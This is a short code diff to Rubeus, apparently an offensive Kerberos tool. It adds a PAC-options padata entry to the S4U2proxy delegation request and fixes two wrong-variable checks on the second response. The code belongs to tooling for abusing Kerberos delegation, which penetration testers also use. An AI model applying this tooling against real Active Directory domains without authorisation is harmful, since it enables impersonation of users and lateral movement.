@@ -91,7 +91,9 @@ namespace Rubeus
                 TGS_REQ s4u2proxyReq = new TGS_REQ();
                 PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype);
                 s4u2proxyReq.padata.Add(padata);
-
+                PA_DATA pac_options = new PA_DATA(false, false, false, true);
+                s4u2proxyReq.padata.Add(pac_options);
+                
                 s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CNAMEINADDLTKT;
 
                 s4u2proxyReq.req_body.realm = domain;
@@ -116,7 +118,7 @@ namespace Rubeus
 
                 Console.WriteLine("[*] Sending S4U2proxy request");
                 byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
-                if (response == null)
+                if (response2 == null)
                 {
                     return;
                 }
@@ -287,7 +289,7 @@ namespace Rubeus
                         }
                     }
                 }
-                else if (responseTag == 30)
+                else if (responseTag2 == 30)
                 {
                     // parse the response to an KRB-ERROR
                     KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
